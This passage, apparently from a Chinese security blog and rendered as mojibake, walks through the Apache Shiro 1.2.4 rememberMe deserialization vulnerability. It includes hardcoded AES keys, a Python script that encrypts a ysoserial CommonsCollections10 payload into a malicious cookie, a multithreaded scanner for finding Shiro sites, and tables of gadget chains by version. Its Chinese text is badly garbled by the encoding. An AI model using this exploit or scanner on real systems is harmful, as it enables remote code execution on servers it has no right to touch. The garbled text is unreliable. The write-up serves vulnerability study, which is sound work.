å¯†ç®—æ³•ï¼Œæ„æ€å°±æ˜¯åŠ å¯†å’Œè§£å¯†ç”¨ç›¸åŒçš„å¯†é’¥ åŠ å¯†è¿‡ç¨‹ï¼š æ˜æ–‡ --&gt; AESåŠ å¯†å‡½æ•° + å¯†é’¥ä½æ•°(128/192.256) + iv(åˆå§‹åŒ–å‘é‡) + å¯†é’¥(key) + æ¨¡å¼(CBCå’ŒGCMç­‰) + padding(å¡«å……æ–¹å¼)--&gt; å¯†æ–‡ IDEAçš„DebugæŒ‰é’®åŠŸèƒ½ï¼š Step Over : å•æ­¥æ‰§è¡Œ,é‡åˆ°æ–¹æ³•ç›´æ¥è·å¾—è¿”å›å€¼è€Œä¸ä¼šè¿›å…¥ Step Into : å•æ­¥æ‰§è¡Œ,é‡åˆ°æ–¹æ³•ä¼šè¿›å…¥æ–¹æ³•ï¼Œä¸ä¼šè¿›å…¥jdkå®ç°çš„æ–¹æ³•ä¸­ Force Step Into : å¯ä»¥è¿›å…¥ä»»ä½•çš„æ–¹æ³•ï¼Œæ¯”å¦‚jdk,jaråŒ… Step Out : åœ¨æ–¹æ³•å†…ä¼šç›´æ¥è·å¾—è¿”å›å€¼è·³å‡ºè¯¥æ–¹æ³• Run To Cursor : è®©ç¨‹åºè¿è¡Œåˆ°é¼ æ ‡æ‰€åœ¨çš„ä½ç½® Drop Frame : è¿”å›ä¸Šä¸€æ­¥ï¼Œæ‘§æ¯å½“å‰æ–¹æ³•è·å¾—çš„å€¼ Resume Program : è¿è¡Œè‡³ä¸‹ä¸€ä¸ªæ–­ç‚¹æ‰€åœ¨ä½ç½® 0x03 åˆ†æç‹¬ç™½ 1. ç¯å¢ƒé…ç½® ç ”ç©¶çš„å‰æè‡ªç„¶æ˜¯è¦æ­å»ºå¥½ç¯å¢ƒ ä¸‹è½½shiroçš„æ¼æ´ç¯å¢ƒï¼Œè¿™é‡Œä½¿ç”¨waråŒ…ï¼Œæ”¾åœ¨tomcatçš„webappsé‡Œï¼Œå¯åŠ¨tomcatï¼Œç„¶åwaråŒ…è‡ªåŠ¨è§£ææˆæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨IDEAæ‰“å¼€æ­¤æ–‡ä»¶å¤¹ é¡ºä¾¿è®²ä¸€ä¸‹IDEAé…ç½®è°ƒè¯•shiro Run -&gt; Edit Configurations -&gt; ç‚¹å‡»+å·æ·»åŠ TomcatServer(Local) -&gt; Serverä¸­é…ç½®Tomcatè·¯å¾„ -&gt; é€‰æ‹©JREç‰ˆæœ¬ -&gt;Deploymentä¸­ç‚¹å‡»+å·æ·»åŠ tomcaté‡Œç”Ÿæˆçš„shiroæ–‡ä»¶å¤¹ -&gt; ç‚¹å‡»Apply è¿è¡Œèµ·æ¥ 2. åˆ†æè¿‡ç¨‹ é¦–å…ˆç¬¬ä¸€ä¸ªç›®çš„æ˜¯æ§åˆ¶rememberMeå‚æ•°çš„å€¼,å…ˆæ‰¾åˆ°å‚æ•°æ‰€åœ¨ä½ç½®ï¼Œå¯¹ç¯å¢ƒçš„åŠŸèƒ½å…ˆæ­£å¸¸ä½¿ç”¨ä¸€é å½“æˆ‘è®¿é—®http://localhost:8080/shiro_web_1_2_4_war/login.jsp ç™»å½•æ—¶å‹¾é€‰Remember Meåï¼Œcookieä¸­å‡ºç°rememberMeå‚æ•°ï¼Œè€Œshiroæ¯æ¬¡éƒ½ä¼šå¯¹cookieä¸­çš„rememberMeæ¥è¿›è¡Œè§£å¯†åååºåˆ—åŒ–æ“ä½œæ¥ç¡®å®šè®¿é—®è€…æƒé™ï¼Œæ‰€ä»¥ç›´æ¥åœ¨cookieä¼ è¾“rememberMeå‚æ•°å°±å¯ä»¥æ§åˆ¶shiroååºåˆ—åŒ–çš„å€¼ ç¬¬äºŒä¸ªç›®çš„æ˜¯è·å¾—åŠ å¯†è§£å¯†çš„æ–¹æ³•ï¼Œä»¥æ­¤æ¥è‡ªè¡ŒåŠ å¯†è§£å¯†æ¶æ„payloadè¿›è¡Œä¼ è¾“ åç¼–è¯‘æ­¤æ¼æ´ç¯å¢ƒä¸­çš„shiroç»„ä»¶jaråŒ… é€‰ä¸­shiro-core-1.2.4.jar -&gt; å³é”® -&gt; Add as Library -&gt; ok é€‰ä¸­shiro-web-1.2.4.jar -&gt; å³é”® -&gt; Add as Library -&gt; ok IDEAä¸­æŒ‰ä¸¤æ¬¡shift æœç´¢å’±ä»¬å‰é¢å‡†å¤‡å½“åšå…¥å£ç‚¹çš„CookieRememberMeManagerç±»ï¼ŒæŒ‰ç€å‡½æ•°åˆ—è¡¨æŸ¥çœ‹åå¹¶æœªå‘ç°æœ‰å…³åŠ å¯†çš„ä¿¡æ¯ï¼Œsoè·Ÿè¿›çˆ¶ç±»AbstractRememberMeManagerå»çœ‹ä¸€ä¸‹ è¿›å…¥æ­¤ç±»å¯ä»¥å‘ç°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„keyï¼Œæ ¹æ®å‚æ•°åDEFAULT_CIPHER_KEY_BYTESä¹Ÿå¯ä»¥æ–­å®šæ˜¯AESåŠ å¯†ä¸­æ‰€ä½¿ç”¨çš„å¯†é’¥ï¼ŒåŒæ—¶ç¡®å®æ˜¯ç›´æ¥å†™å…¥äº†ä»£ç ä¸­ï¼Œç¬¦åˆä¸Šé¢é€šè¿‡æè¿°å¯çŸ¥çš„AESå¯†é’¥ç¡¬ç¼–ç åœ¨æºä»£ç ä¸­çš„æ¡ä»¶ è¿™é‡Œæˆ‘åœ¨AbstractRememberMeManagerç±»å‡½æ•°åä¸ºencrypt(åŠ å¯†)ä¸­ä¸‹äº†æ–­ç‚¹ï¼Œç„¶ååœ¨webç«¯è¿›è¡Œç™»å½•æ“ä½œï¼Œå¼€å§‹debugï¼Œè¿è¡Œè‡³encryptå‡½æ•°ä¼ å…¥å‚æ•°serializedï¼Œç„¶åç‚¹å‡»Drop Frameè¿”å›ä¸Šä¸ªæ–¹æ³•å‘ç°ä¼ å…¥çš„serializedçš„å€¼æ˜¯æˆ‘åˆšæ‰webç«¯ç™»å½•çš„ç”¨æˆ·årootåºåˆ—åŒ–åçš„æ•°æ®ï¼Œæ ¹æ®è¿è¡Œæ­¥éª¤å‡½æ•°åçŒœæµ‹æµç¨‹æ˜¯shiroéªŒè¯å®Œäº†ç™»å½•çš„è´¦å·å¯†ç ï¼Œç„¶åæ ¹æ®ç”¨æˆ·åç”Ÿæˆåºåˆ—åŒ–æ•°æ®å‡†å¤‡è¿›è¡ŒåŠ å¯†äº† å†æ¬¡æ•²é»‘æ¿ DebugæŒ‰é’®åŠŸèƒ½ï¼š Step Over : å•æ­¥æ‰§è¡Œ,é‡åˆ°æ–¹æ³•ç›´æ¥è·å¾—è¿”å›å€¼è€Œä¸ä¼šè¿›å…¥ Step Into : å•æ­¥æ‰§è¡Œ,é‡åˆ°æ–¹æ³•ä¼šè¿›å…¥æ–¹æ³•ï¼Œä¸ä¼šè¿›å…¥jdkå®ç°çš„æ–¹æ³•ä¸­ Force Step Into : å¯ä»¥è¿›å…¥ä»»ä½•çš„æ–¹æ³•ï¼Œæ¯”å¦‚jdk,jaråŒ… Step Out : åœ¨æ–¹æ³•å†…ä¼šç›´æ¥è·å¾—è¿”å›å€¼è·³å‡ºè¯¥æ–¹æ³• Run To Cursor : è®©ç¨‹åºè¿è¡Œåˆ°é¼ æ ‡æ‰€åœ¨çš„ä½ç½® Drop Frame : è¿”å›ä¸Šä¸€æ­¥ï¼Œæ‘§æ¯å½“å‰æ–¹æ³•è·å¾—çš„å€¼ Resume Program : è¿è¡Œè‡³ä¸‹ä¸€ä¸ªæ–­ç‚¹æ‰€åœ¨ä½ç½® åœ¨è°ƒè¯•çš„å˜é‡æ¡†é‡Œçœ‹åˆ°åŠ å¯†çš„è®¾ç½®ä¸ºAESåŠ å¯†ï¼Œæ¨¡å¼ä¸ºCBCï¼Œ128ä½ï¼Œå¡«å……æ–¹å¼ä¸ºPKCS5Padding ç»§ç»­Force Step Into(ä¸‹ä¸€æ­¥)ï¼Œè¿›å…¥cipherService.encryptçš„æ–¹æ³•ä¸­ï¼Œè·³åˆ°äº†JcaCipherServiceç±»ä¸­çš„encryptæ–¹æ³•ä¸­,æ–¹æ³•ä¸­æœ‰ä¸ªivByteså˜é‡ï¼Œå€¼æ˜¯éšæœºç”Ÿæˆçš„16ä¸ªå­—èŠ‚ï¼Œç„¶åè·³åˆ°äº†æ­¤ç±»ä¸­çš„å¦ä¸€ä¸ªencryptæ–¹æ³•ï¼Œå°±æ˜¯å›¾ç‰‡æ¡†ä¸­ä¸‹é¢é‚£ä¸ªencryptæ–¹æ³• ã€+ã€‘return this.encrypt(plaintext, key, ivBytes, generate); plaintext ä¸º åºåˆ—åŒ–çš„ç”¨æˆ·å key ä¸º DEFAULT_CIPHER_KEY_BYTES å°±æ˜¯ä¸Šé¢base64è§£ç çš„é‚£ä¸ªå¯†é’¥ ivBytes ä¸º éšæœºç”Ÿæˆçš„é•¿åº¦ä¸º16çš„å­—èŠ‚ generate ä¸º true è·³å…¥çš„encryptæ–¹æ³•ï¼Œä¸æ¸…æ¥šjavaçš„ä¸€äº›æ–¹æ³•ä½œç”¨ä¸€å®šè¦çœ‹å›¾ç‰‡ä¸­çš„å¤‡æ³¨ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯çœŸæ­£çš„ç”ŸæˆåŠ å¯†ç»“æœçš„åœ°æ–¹ï¼Œæˆ‘ä¼šæè¿°çš„è¯¦ç»†ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘æ˜¯åƒåœ¾ä¸å†™å°±å¿˜ ç»§ç»­Step Over(ä¸‹ä¸€æ­¥)ï¼Œå°±å›åˆ°äº†æ¢¦å¼€å§‹(ä¸‹çš„æ–­ç‚¹)çš„åœ°æ–¹ ~ï¼Œvalueå˜é‡çš„å€¼å°±æ˜¯ä¸Šé¢æ­¥éª¤çš„outputå˜é‡çš„å€¼ ç»§ç»­ä½¿ç”¨Force Step Into(ä¸‹ä¸€æ­¥)å’ŒStep Out(åœ¨æ–¹æ³•å†…ç›´æ¥è·å¾—è¿”å›å€¼å¹¶è·³åˆ°ä¸‹ä¸€æ­¥)è°ƒè¯•ï¼Œç›¯ç€å­˜å‚¨ç€åŠ å¯†ç»“æœçš„å˜é‡ï¼Œé‡åˆ°æ²¡æœ‰å¯¹æ­¤å˜é‡æ“ä½œçš„ç›´æ¥è·å¾—è¿”å›å€¼ä¸‹ä¸€æ­¥ï¼Œæœ€ç»ˆåˆ°äº†CookieRememberMeManagerç±»ä¸­çš„rememberSerializedIdentityæ–¹æ³•åˆå¯¹å­˜å‚¨ç€åŠ å¯†ç»“æœçš„å˜é‡è¿›è¡Œäº†ä¸€æ¬¡base64åŠ å¯†ï¼Œç„¶åèµ‹å€¼åˆ°äº†cookieçš„rememberMeå‚æ•°ä¸­ï¼Œåˆ°æ­¤åŠ å¯†è¿‡ç¨‹ç»“æŸã€‚ æœ€ç»ˆæ€»ç»“åŠ å¯†è¿‡ç¨‹ä¸ºï¼š è®¾å®šï¼šå¯†é’¥ = kPH+bIxk5D2deZiIxcaaaA== 1.è·å¾—æ˜æ–‡ = æ­£å¸¸è¯†åºåˆ—åŒ–ç”¨æˆ·ååçš„å­—èŠ‚(root) 2.ä»¥ä¸‹æ­¥éª¤ï¼š ç§‘æ™®çŸ¥è¯†ï¼šæ­£å¸¸çš„AESåŠ å¯†æ‰€éœ€å‚æ•° = æƒ³åŠ å¯†çš„å­—ç¬¦ä¸² + iv + key + CBC + padding shiroï¼šAESåŠ å¯† = æƒ³åŠ å¯†çš„å­—ç¬¦ä¸² (æ˜æ–‡) + iv(éšæœºç”Ÿæˆçš„é•¿åº¦ä¸º16çš„å­—èŠ‚) + key(base64è§£ç å¯†é’¥çš„ç»“æœ) + CBC + PKCS5Padding 3.éšæœºç”Ÿæˆçš„é•¿åº¦ä¸º16çš„å­—èŠ‚ + AESåŠ å¯†ç»“æœ (å°±æ˜¯æ‹¼æ¥äº†ä¸€ä¸‹) 4.base64åŠ å¯† é‚£ä¹ˆè§£å¯†è¿‡ç¨‹ä¸º: è®¾å®šï¼šå¯†é’¥ = kPH+bIxk5D2deZiIxcaaaA== 1.è·å¾—å¯†æ–‡ = base64è§£å¯†rememberMeå‚æ•°ä¼ è¿‡æ¥çš„å€¼ 2.ä»¥ä¸‹æ­¥éª¤ï¼š ç§‘æ™®çŸ¥è¯†ï¼šæ­£å¸¸çš„AESè§£å¯†æ‰€éœ€å‚æ•° = æƒ³è§£å¯†çš„å­—ç¬¦ä¸² + iv + key + CBC shiroï¼šAESè§£å¯† = æƒ³è§£å¯†çš„å­—ç¬¦ä¸²(åˆ é™¤å¯†æ–‡å‰16ä¸ªå­—èŠ‚çš„å‰©ä½™å­—èŠ‚)+iv(å¯†æ–‡çš„å‰16ä¸ªå­—èŠ‚) + key(base64è§£ç å¯†é’¥çš„ç»“æœ) + CBC + PKCS5Padding 3.å¯¹è§£å¯†ç»“æœè¿›è¡Œååºåˆ—åŒ–ï¼Œè§¦å‘payload â€‹ åœ¨è¿›è¡Œç¬¬ä¸‰ä¸ªç›®çš„å‰çœ‹ä¸€ä¸‹æœ€ç»ˆè§¦å‘ååºåˆ—åŒ–çš„åœ°æ–¹åœ¨å“ªé‡Œï¼ŒæŒ‰ç…§åŠ å¯†æ–¹æ³•è°ƒè¯•è¿‡ç¨‹ï¼Œåœ¨è§£å¯†æ–¹æ³•å¤„æ·»åŠ æ–­ç‚¹ï¼Œç„¶ååœ¨ç½‘é¡µä¸Šå…ˆç™»å½•åï¼Œå¼€å¯è°ƒè¯•ï¼Œè¿è¡Œè‡³decryptæ–¹æ³•åœä½åè¿›è¡ŒForce Step Into(ä¸‹ä¸€æ­¥)å’ŒStep Out(åœ¨æ–¹æ³•å†…ç›´æ¥è·å¾—è¿”å›å€¼å¹¶è·³åˆ°ä¸‹ä¸€æ­¥)è°ƒè¯•ï¼Œç›´åˆ°DefaultSerializerçš„deserializeæ–¹æ³•ã€‚ â€‹ æ‰¾åˆ°shiroè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä»£ç ä½ç½®åï¼Œå¯ä»¥å‘ç°shiroçš„serializeæ–¹æ³•ä½¿ç”¨ByteArrayOutputStreamåˆ›å»ºäº†å­—èŠ‚æ•°ç»„ç¼“å†²åŒºæ¥å­˜å‚¨åºåˆ—åŒ–çš„å­—èŠ‚ç ï¼Œè€Œä¸æ˜¯ç”Ÿæˆè½åœ°æ–‡ä»¶ï¼Œå›åˆ°deserializeæ–¹æ³•ï¼ŒåŒæ ·ç”Ÿæˆç¼“å†²åŒºå­˜å‚¨ä¼ è¿‡æ¥çš„åºåˆ—åŒ–å­—èŠ‚ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶æœ€ç»ˆè¿è¡Œäº†readObjectæ–¹æ³•ï¼Œå¦‚æœååºåˆ—åŒ–çš„æ˜¯æˆ‘ä»¬çš„payloadï¼Œåˆ°è¿™é‡Œå°±æ‰§è¡Œå‘½ä»¤äº†ã€‚ ç¬¬ä¸‰ä¸ªç›®çš„æ˜¯æ„é€ è„šæœ¬è¿›è¡Œåˆ©ç”¨ï¼Œå…ˆå°†shiroçš„åŠ å¯†è¿‡ç¨‹å’Œè§£å¯†è¿‡ç¨‹å†™å‡ºæ¥(é«˜ç‰ˆæœ¬GCMæ¨¡å¼çš„è„šæœ¬æ²¡å†™ï¼Œå°æ”¹ä¸€ä¸‹å°±æ˜¯äº†) def encode(target): iv = uuid.uuid4().bytes #ç”¨å¥½çœ‹çš„æ–¹å¼éšæœºç”Ÿæˆ16å­—èŠ‚ # iv = bytes('1111111111111111',encoding='utf-8') realkey = base64.b64decode(key) #è§£å¯†key mode = AES.MODE_CBC pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBCæ¨¡å¼è¦æ±‚æ˜æ–‡é•¿åº¦è¦æ˜¯16çš„å€æ•°ï¼Œä½æ•°ä¸è¶³16ä½çš„æ·»åŠ å­—èŠ‚è¡¥å…… resultAES = AES.new(realkey,mode,iv) nice = resultAES.encrypt(pad(target)) nice = iv + nice nice = base64.b64encode(nice) print(&quot;åŠ å¯†ç›®æ ‡:\\n&quot; + str(target) + &quot;\\n\\nåŠ å¯†ç»“æœ:\\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\\n&quot;) def decode(target): realkey = base64.b64decode(key) #è§£å¯†key targetText = base64.b64decode(target) # æƒ³è¦è§£å¯†çš„å¯†æ–‡ iv = targetText[0:16] realText = targetText[16:] mode = AES.MODE_CBC resultAES = AES.new(realkey, mode, iv)# åˆå§‹åŒ–AESå‚æ•° nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #è§£å¯†å¯†æ–‡å¹¶è®¾ç½®å¿½ç•¥ä¸€äº›é”™è¯¯é˜²æ­¢æŠ¥é”™ print(&quot;\\nè§£å¯†ç›®æ ‡:\\n&quot; + target + &quot;\\n\\nè§£å¯†ç»“æœ:\\n&quot; + nice + &quot;\\n&quot;) ç„¶åæ˜¯åŠ ä¸Š ä½¿ç”¨ysoserialç”Ÿæˆçš„javaå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ä¾èµ–åº“çš„payloadï¼Œä¸€ä¸ªåˆ©ç”¨ä»£ç æ¨¡å­å°±å‡ºæ¥äº†ï¼Œä¼˜ç§€çš„å·¥å…·å·²ç»æœ‰å¾ˆå¤šäº†ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œæˆ‘çš„to doé‡Œæ˜¯æœ‰æ•´åˆåˆ©ç”¨é“¾çš„æƒ³æ³•çš„ï¼Œä¸è¿‡ysoçš„cbåˆ©ç”¨é“¾è¿˜åœ¨åŠªåŠ›è‡ªé—­ä¸­~ å› ä¸ºæˆ‘æ ¹æœ¬å°±ä¸ä¼šjavaå‘€ (#.#) ï¼Œæš‚æ—¶å­¦ä¹ äº†ä¸€äº›éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼Œç„¶ååˆ†æäº†æœ€ç®€å•çš„URLDNSï¼Œæœ‰æ—¶é—´æˆ‘æ•´ç†ä¸€ä¸‹å­¦ä¹ çš„ç¬”è®°åœ¨æ°´ä¸€ä¸‹ã€‚ from Crypto.Cipher import AES import base64,uuid import subprocess decodeTarget = 'iDQHUONAt/tMN2mHSjCMkopnzE0hn1QgCkZ4I5YrOg5mgCVhgUeoY9AIYHe1CasY6+YrBDNJ+8sasUal9wRYCxAYplrqO25KIlyC1FG7wKjDg3H0Q98aH2+PW8TGkM/leP9Wzl3wbC9Z2t8Thg8abQQ2n3+TMZ1JKyi79EZQgIH7KBmmcNaYkKuDwgCYZKKWtHp4jnWJ6O1qhBxQOr87J5Z6t6vUCf7axIZ3VArtTCAqnxwZT2v6zaVZjVLxWbo3rkyi+TE8RamCDMwzT20XkvKJ1xhUDI58iheSw7e2KP6ctQ8x0Hx5tCqSbwNB03yXuWSCAArTl58QKTByoBBk3PNjmcMk47u5EPUTTE5TPcoqhGXUEDSpjc7lQDdFQ4jxU+eWRZY3jPJw4gQAoX9LEPpIRhijNeopA0Im0jFjtqg+rr7ysp5D6KChzOpzgpewANWT2VLAYEoyZXVU/+f7mP56Pz2vyucX9DvliVDDS6D9hcSQw4mrW3pBzuy+A7hM' encodeTarget = 'root' key = 'kPH+bIxk5D2deZiIxcaaaA==' def encode(target): iv = uuid.uuid4().bytes #ç”¨å¥½çœ‹çš„æ–¹å¼éšæœºç”Ÿæˆ16å­—èŠ‚ # iv = bytes('1111111111111111',encoding='utf-8') realkey = base64.b64decode(key) #è§£å¯†key mode = AES.MODE_CBC pad = lambda s: s + ((16 - len(s) % 16) * chr(16 - len(s) % 16)).encode() #CBCæ¨¡å¼è¦æ±‚æ˜æ–‡é•¿åº¦è¦æ˜¯16çš„å€æ•°ï¼Œä½æ•°ä¸è¶³16ä½çš„æ·»åŠ å­—èŠ‚è¡¥å…… resultAES = AES.new(realkey,mode,iv) nice = resultAES.encrypt(pad(target)) nice = iv + nice nice = base64.b64encode(nice) print(&quot;åŠ å¯†ç›®æ ‡:\\n&quot; + str(target) + &quot;\\n\\nåŠ å¯†ç»“æœ:\\n&quot; + nice.decode(&quot;utf-8&quot;) + &quot;\\n&quot;) def decode(target): realkey = base64.b64decode(key) #è§£å¯†key targetText = base64.b64decode(target) # æƒ³è¦è§£å¯†çš„å¯†æ–‡ iv = targetText[0:16] realText = targetText[16:] mode = AES.MODE_CBC resultAES = AES.new(realkey, mode, iv)# åˆå§‹åŒ–AESå‚æ•° nice = (resultAES.decrypt(realText)).decode('utf-8', errors='ignore') #è§£å¯†å¯†æ–‡å¹¶è®¾ç½®å¿½ç•¥ä¸€äº›é”™è¯¯é˜²æ­¢æŠ¥é”™ print(&quot;\\nè§£å¯†ç›®æ ‡:\\n&quot; + target + &quot;\\n\\nè§£å¯†ç»“æœ:\\n&quot; + nice + &quot;\\n&quot;) popen = subprocess.Popen('java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 &quot;sleep-5&quot;', shell=True, stdout=subprocess.PIPE) file_body = popen.stdout.read() #è¯»å–ç”Ÿæˆçš„payloadå­—èŠ‚ç  decode(decodeTarget) encode(file_body) 0x04 shiroç»„ä»¶æ£€æµ‹ å†™çš„ä¸€ä¸ªæ£€æµ‹shiroç»„ä»¶çš„è„šæœ¬ï¼Œé€Ÿåº¦å¾ˆå¿«ã€‚ import requests import sys,re import threadpool #from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings() def exp(line): header={ 'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;', 'Cookie':'a=1;rememberMe=1' } check_one=&quot;rememberMe&quot; #åœºæ™¯1 check_two=&quot;deleteMe&quot; #åœºæ™¯2 isExist = False with open('ScanResult.txt',&quot;a&quot;) as f: if 'http' not in line: line = 'http://'+line try: x = requests.head(line,headers=header,allow_redirects=False,verify=False,timeout=6) #åœºæ™¯4 y = str(x.headers) z = checkRe(y) a = requests.head(line,headers=header,verify=False,timeout=6) #åœºæ™¯5 b = str(a.headers) c = checkRe(b) if check_one in y or z or check_two in y or c: isExist = True if isExist: print(&quot;[+ &quot;+&quot;!!! å­˜åœ¨shiro: &quot;+&quot;çŠ¶æ€ç : &quot;+str(x.status_code)+&quot; url: &quot;+line) f.write(line+&quot;\\n&quot;) else: print(&quot;[- &quot;+&quot;ä¸å­˜åœ¨shiro &quot;+&quot;çŠ¶æ€ç : &quot;+str(x.status_code)+&quot; url: &quot;+line) except Exception as httperror: print(&quot;[- &quot;+&quot;ç›®æ ‡è¶…æ—¶, ç–‘ä¼¼ä¸å­˜æ´»: &quot;+&quot; url: &quot;+line) def checkRe(target): #åœºæ™¯3 pattern = re.compile(u'^re(.*?)Me') result = pattern.search(target) if result: return True else: return False def multithreading(funcname, params=[], filename=&quot;ip.txt&quot;, pools=5): works = [] with open(filename, &quot;r&quot;) as f: for i in f: func_params = [i.rstrip(&quot;\\n&quot;)] + params works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(funcname, works) [pool.putRequest(req) for req in reqs] pool.wait() def main(): multithreading(exp, [], &quot;url.txt&quot;, 10) # é»˜è®¤15çº¿ç¨‹ print(&quot;å…¨éƒ¨checkå®Œæ¯•ï¼Œè¯·æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„shiro.txt&quot;) if __name__ == &quot;__main__&quot;: main() åˆ¤å®šæ˜¯å¦å­˜åœ¨shiroçš„æ¡ä»¶: 1.å‘é€å¸¦æœ‰rememberMe=1çš„cookieï¼Œè¿”å›httpå¤´æ˜¯å¦å­˜åœ¨rememberMe 2.å‘é€å¸¦æœ‰rememberMe=1çš„cookieï¼Œè¿”å›httpå¤´æ˜¯å¦å­˜åœ¨deleteMe 3.å‘é€å¸¦æœ‰rememberMe=1çš„cookieï¼Œè¿”å›httpå¤´æ˜¯å¦å­˜åœ¨åŒ¹é…æ­£åˆ™^re(.*?)Meçš„ 4.å‘é€å¸¦æœ‰rememberMe=1çš„cookieï¼Œè¯·æ±‚æ—¶è„šæœ¬è®¾ç½®æˆè·Ÿéšè·³è½¬åæ£€æµ‹å‰ä¸¤é¡¹ 5.å‘é€å¸¦æœ‰rememberMe=1çš„cookieï¼Œè¯·æ±‚æ—¶è„šæœ¬è®¾ç½®æˆä¸è·Ÿéšè·³è½¬æ£€æµ‹å‰ä¸¤é¡¹ ä¸€å¼€å§‹å†™çš„æ—¶å€™æ£€æµ‹æ¡ä»¶æ˜¯æ£€æµ‹çš„rememberMe=deleteMeå­—ç¬¦ä¸²ï¼Œå› ä¸ºè§è¿‡ç½‘ç«™è¿”å›å¤´æ˜¯ä¸‹å›¾è¿™æ ·çš„(å¼€å‘ç¥­å¤©)ï¼Œè¿”å›httpå¤´æ˜¯remeberMe=deleteMe ã€‚ã€‚å°±åˆ†å¼€æ£€æµ‹äº†å­—ç¬¦ä¸²ï¼Œå†åŠ äº†ä¸ªæ­£åˆ™ä¿é™©ä¸‹ã€‚ æœ‰çš„ç½‘ç«™ä¼šè‡ªåŠ¨è·³è½¬åˆ°æŸä¸ªè·¯å¾„æ˜¾ç¤ºé¦–é¡µï¼Œæ‰€ä»¥è®¾ç½®äº†è·Ÿéšè·³è½¬å’Œä¸è·Ÿéšè·³è½¬ï¼Œæ²¡å›¾è„‘è¡¥å§ï¼Œæ£€æµ‹æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œæœ‰çš„ç«™çš„shiroç»„ä»¶å­˜åœ¨æ£€æµ‹è¿˜è¦æ˜¯ç™»å½•é¡µè¾“å…¥è´¦å·å¯†ç ç™»å½•æ—¶çš„é‚£ä¸ªè·¯å¾„æˆ–è€…å’Œpostæäº¤æœ‰å…³ï¼Œæ‰€ä»¥å¯ä»¥å†åŠ ä¸ªpostæ–¹å¼è¯·æ±‚çš„åˆ¤æ–­æ¡ä»¶ï¼Œè¿˜å¯ä»¥å­¦çˆ¬è™«è‡ªåŠ¨è¾“å…¥è´¦å·å¯†ç postæäº¤è¿™ç§çš„åˆ¤æ–­æ¡ä»¶ï¼Œå…·ä½“ä»£ç å°±å¾—è‡ªè¡Œå‘æŒ¥å•¦ 0x05 shiroç»„ä»¶çš„é»˜è®¤gadget Shiroæ˜¯å¼€æºçš„ï¼Œæ‰€ä»¥shiroçš„æºç åœ¨githubä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œè€Œå¼€å‘åœ¨å¼€å‘é¡¹ç›®çš„æ—¶å€™å¦‚æœé€šè¿‡pom.xmlå¼•å…¥shiroæ—¶ï¼Œä¼šè‡ªåŠ¨å¼•å…¥commons-beanutilsåº“ï¼Œè€Œè¿™ä¸ªä¾èµ–åº“æ­£æ˜¯å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨çš„javaä¾èµ–åº“ä¹‹ä¸€ï¼Œå¹¶ä¸”ä¸€ä¸€æŸ¥çœ‹åå‘ç°shiroç‰ˆæœ¬å¯¹åº”çš„commons-beanutilsåº“çš„ç‰ˆæœ¬æœ‰äº›è®¸ä¸åŒ æŸ¥çœ‹ä¸åŒç‰ˆæœ¬shiroçš„pom.xmlåæ€»ç»“å¯¹åº”å…³ç³»ä¸º: Shiroç‰ˆæœ¬ CBé“¾ shiro-root-1.1.0(ä¸åŒ…å«)â€”æ›´æ—©ç‰ˆæœ¬ 1.7.0 shiro-root-1.1.0(åŒ…å«)â€”1.3.2(åŒ…å«) 1.8.3 1.4.0(åŒ…å«)â€”1.4.2(åŒ…å«) 1.9.3 1.5.0(åŒ…å«)â€”shiro-root-1.7.0(åŒ…å«) 1.9.4 ç„¶ååˆå»æŸ¥çœ‹äº†Githubä¸Šcommons-beanutilsé¡¹ç›®çš„pom.xmlï¼Œä»1.8.3å¼€å§‹çœ‹çš„ï¼Œé‡Œé¢æ˜¯å†…ç½®äº†commons-collectionsé“¾ CBé“¾ CCé“¾ 1.8.3 3.2.1 1.9.3 3.2.2 1.9.4 3.2.2 æ‰€ä»¥æœ€ç»ˆshiroä½¿ç”¨æ¼æ´ç‰ˆæœ¬1.2.4æˆ–å…¶ä»–é«˜ç‰ˆæœ¬shiroä½†å¼€å‘è‡ªå·±åœ¨shiroçš„é…ç½®æ–‡ä»¶ä¸­å›ºå®škeyå¯¼è‡´å­˜åœ¨æ¼æ´ï¼Œå‡ ç‡è¾ƒé«˜å­˜åœ¨çš„gadgetå¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œåœ¨å¾€ä¸‹ç»†èŠ‚åˆ’åˆ†åŠgatgetçš„åŸç†è¿˜éœ€è¦ç»§ç»­æœ‰æ—¶é—´å†å­¦ä¹ äº† 0x06 å¢åŠ shiroé«˜ç‰ˆæœ¬å­˜åœ¨æ¼æ´å‡ ç‡ åŠ å¢åŠ æ™®é€šshiroæ¼æ´å‡ ç‡ æ— æ„é—´æŸ¥äº†ä¸€ä¸‹shiroçš„ä¸€äº›æ•™å­¦ï¼Œå‘ç°äº†ä¸€ä¸ªæ’åé å‰çš„&quot;é è°±æ•™ç¨‹&quot;ï¼Œè™½ç„¶ä»–å¸–å­å†™çš„æ˜¯shiroçš„1.5.3ç‰ˆæœ¬ï¼Œä½†æ˜¯å‘ç°åé¢çš„è‡ªå®šä¹‰ä»£ç ä¸­å›ºå®šäº†key:2AvVhdsgUs0FSA3SDFAdag== 